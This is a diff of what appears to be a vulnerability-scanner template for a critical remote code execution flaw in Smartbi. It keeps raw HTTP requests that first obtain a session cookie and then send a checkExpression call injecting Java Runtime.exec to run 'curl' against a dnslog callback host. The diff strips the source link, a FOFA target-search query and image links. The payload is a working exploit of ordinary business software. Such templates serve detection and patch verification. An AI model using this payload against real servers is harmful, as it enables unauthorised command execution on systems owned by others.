@@ -3,12 +3,8 @@ info:
   name: Smartbi存在远程代码执行漏洞漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mw0cmeyi7pzic26d'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mw0cmeyi7pzic26d
-    fofa: app="SMARTBI"
 http:
 - raw:
   - 'GET /smartbi/vision/share.jsp?resid=b904ab9f5a84712a672523a7b4881ee4 HTTP/1.1
@@ -20,8 +16,6 @@ http:
     Accept: */*
 
     Connection: keep-alive
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547092265-dce5d179-1c68-4c2b-86c7-9d877d13aeae.png)
 
 
     取响应生成的JSESSIONID'
@@ -44,10 +38,7 @@ http:
     Connection: keep-alive
 
 
-    className=MetricsModelForVModule&methodName=checkExpression¶ms=["java.lang.Runtime.getRuntime().exec(''curl n3u9pe.dnslog.cn'')"]
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547092472-edef68ba-2200-4fcb-9a0b-f359e2f02e76.png)'
+    className=MetricsModelForVModule&methodName=checkExpression¶ms=["java.lang.Runtime.getRuntime().exec(''curl n3u9pe.dnslog.cn'')"]'
   redirects: false
   matchers:
   - status:
